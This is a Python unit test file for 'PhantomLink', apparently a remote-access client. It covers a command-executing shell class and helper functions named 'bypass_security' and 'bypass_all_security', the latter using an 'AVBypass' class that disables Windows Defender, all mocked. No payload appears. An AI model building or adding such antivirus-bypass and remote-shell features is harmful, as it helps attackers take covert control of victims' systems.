import os
import sys
import unittest
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

_REPO_ROOT = Path(__file__).resolve().parents[1]
if str(_REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(_REPO_ROOT))

_CLIENT_DIR = _REPO_ROOT / "client"
if str(_CLIENT_DIR) not in sys.path:
    sys.path.insert(0, str(_CLIENT_DIR))

import client.PhantomLink as pl


class PhantomLinkCleanBoostTests(unittest.TestCase):
    """Deterministic, zero-hang branch coverage tests for client/PhantomLink.py."""

    def test_shell_client_command_branches_clean(self):
        sc = pl.ShellClient()

        # cd & pwd
        self.assertEqual(sc.execute_command("pwd"), os.getcwd())

        with patch("os.chdir"):
            res = sc.execute_command(r"cd C:\Windows")
            self.assertIn("Changed directory", res)

        # subprocess.run success and timeout
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(stdout="Sample Output", stderr="", returncode=0)
            res = sc.execute_command("whoami")
            self.assertIn("Sample Output", res)

            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 300)
            res = sc.execute_command("sleep 100")
            self.assertIn("timed out", res)

        # exit command
        res = sc.execute_command("exit")
        self.assertTrue(sc.should_exit)
        self.assertIn("Exiting", res)

    def test_security_helpers_clean(self):
        with patch("subprocess.run") as mock_run:
            mock_run.return_value = MagicMock(returncode=0)
            self.assertTrue(pl.bypass_security())

        with patch("client.PhantomLink.AVBypass") as mock_avb:
            mock_avb.return_value.disable_defender = MagicMock()
            self.assertTrue(pl.bypass_all_security())


if __name__ == "__main__":
    unittest.main()
